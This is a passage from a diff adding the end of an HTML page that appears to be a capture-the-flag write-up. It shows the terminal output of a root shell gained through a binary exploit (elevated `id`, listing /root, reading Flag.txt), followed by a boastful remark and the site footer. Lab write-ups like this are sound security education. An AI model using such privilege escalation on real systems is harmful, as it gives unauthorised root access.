+                141
+                142
+                143
+                144
+                145
+                146
+                147
+                148
+                149
+                150
+                151
+                152
+                153
+                154
+                155
+                156
+                157
+                158
+                159
+                160
+                161
+                162
+                163
+                164
+                165
+                166
+                167
+                168
+                169
+                170
+                171
+                172
+                173
+                174
+                175
+                176
+                177
+                178
+                179
+                180
+                181
+                182
+                183
+                184
+                185
+                186
+                187
+                188
+                189
+                190
+                191
+                192
+                193
+                194
+                195
+                196
+                197
+                198
+                199
+                200
+                201
+                202
+                203
+                204
+                205
+                206
+                207
+                208
+                209
+                210
+                211
+                212
+                213
+                214
+                215
+                216
+                217
+                218
+                219
+                # id
+                uid=1000(smeagol) gid=1000(smeagol) euid=0(root) groups=0(root),1000(smeagol)
+                # ls
+                payload.py
+                # ls /root  
+                buf  buf.c  Flag.txt  other  other.c  switcher.py
+                # cat /root/Flag.txt
+                “There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
+                – Gandalf
+                # 
+                </code></pre>
+                </div>
+            
+                <div class="text">
+
+                  <p>Boom. It dropped a shell! And it only took 220 iterations of my code.</p>
+                  </div>
+      </article>
+
+		<section id="footer">
+			<ul class="icons">
+				<li><a href="#" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
+				<li><a href="#" class="icon brands fa-facebook-f"><span class="label">Facebook</span></a></li>
+				<li><a href="#" class="icon brands fa-google-plus-g"><span class="label">Google+</span></a></li>
+				<li><a href="#" class="icon brands fa-pinterest"><span class="label">Pinterest</span></a></li>
+				<li><a href="#" class="icon brands fa-dribbble"><span class="label">Dribbble</span></a></li>
+				<li><a href="#" class="icon brands fa-linkedin-in"><span class="label">LinkedIn</span></a></li>
+			</ul>
+			<div class="copyright">
+				<ul class="menu">
+					<li>&copy; </a></li>
+				</ul>
+			</div>
+		</section>
+    <br />
+
+		<!-- Scripts -->
+			<script src="/assets/js/jquery.min.js"></script>
+			<script src="/assets/js/jquery.scrolly.min.js"></script>
+			<script src="/assets/js/jquery.poptrox.min.js"></script>
+			<script src="/assets/js/browser.min.js"></script>
+			<script src="/assets/js/breakpoints.min.js"></script>
+			<script src="/assets/js/util.js"></script>
+			<script src="/assets/js/main.js"></script>
+      <script src="/assets/js/button.js"></script>
+			<script src="/assets/js/NavBar.js"></script>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
+      <script src="/assets/js/highlight.pack.js"></script>
+      <script>hljs.initHighlightingOnLoad();</script>
+
+
+	</body>
+</main>
+</html>
